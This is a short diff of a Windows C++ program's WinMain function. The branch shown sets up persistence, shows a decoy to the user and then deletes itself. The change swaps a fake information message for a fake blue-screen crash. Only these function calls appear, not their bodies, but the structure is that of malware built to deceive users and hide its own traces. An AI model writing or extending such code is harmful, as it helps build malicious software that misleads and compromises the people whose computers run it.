@@ -39,7 +39,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     } else {
         persistence::establishPersistence();
-        decoy::ShowInfoMessage();
+        decoy::ShowBSOD();
         cleanup::SelfDelete();
     }
 
